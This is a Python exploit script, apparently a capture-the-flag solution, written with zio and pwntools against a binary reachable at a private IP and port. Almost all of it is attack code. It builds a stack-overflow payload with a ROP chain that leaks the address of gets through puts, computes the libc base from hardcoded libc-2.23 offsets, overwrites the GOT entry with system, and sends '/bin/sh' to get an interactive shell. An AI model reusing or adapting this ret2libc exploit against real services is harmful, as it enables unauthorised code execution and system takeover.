from zio import *
from pwn import *
is_local = True
is_local = False


libc = ELF('./libc-2.23.so')
binary_path = "./bin"

libc_file_path = ""
#libc_file_path = "./libc.so.6"

ip = "192.168.1.48"
port = 12001

if is_local:
	target = binary_path
else:
	target = (ip, port)

def d2v_x64(data):
	return l64(data[:8].ljust(8, '\x00'))

def d2v_x32(data):
	return l32(data[:4].ljust(4, '\x00'))

def rd_wr_str(io, info, buff):
	io.read_until(info)
	io.write(buff)

def rd_wr_int(io, info, val):
	rd_wr_str(io, info, str(val) + "\n")


def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	#io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m, env={"LD_PRELOAD":libc_file_path})
	return io

def pwn(io):

	p_rdi_ret = 0x0000000000401a23
	p_rsi_r15_ret = 0x0000000000401a21
	gets_got                   = 0x0000000000603088
	offset_gets                = 0x6ed80 

	gets_plt                   = 0x0000000000400cd0
	puts_plt                   = 0x0000000000400c30

	offset_system = 0x45390
	offset_binsh = 0x18cd17

	rop_data = ""
	rop_data += l64(p_rdi_ret)
	rop_data += l64(gets_got)
	rop_data += l64(puts_plt)

	rop_data += l64(p_rdi_ret)
	rop_data += l64(gets_got)
	rop_data += l64(gets_plt)

	rop_data += l64(p_rdi_ret)
	rop_data += l64(gets_got + 8)
	rop_data += l64(gets_plt)


	payload = ""
	payload += '\x00'*0x20
	payload += l64(0x01)
	payload += rop_data
	payload += "\n"

	io.gdb_hint()
	rd_wr_str(io, "you name?", payload)

	io.read_until("here ")
	io.read_until("\n")
	data = io.read_until("\n")[:-1]

	gets_addr = d2v_x64(data)
	leak_addr = gets_addr
	leak_offset = offset_gets
	libc_base = leak_addr - leak_offset
	system_addr = libc_base + offset_system

	io.writeline(l64(system_addr) + "/bin/sh")


	io.interact()

	#offset info
	if is_local:
		#local
		offset_system = 0x0
		offset_binsh = 0x0
	else:
		#remote	
		offset_system = 0x0
		offset_binsh = 0x0

	pass	

io = get_io(target)
pwn(io)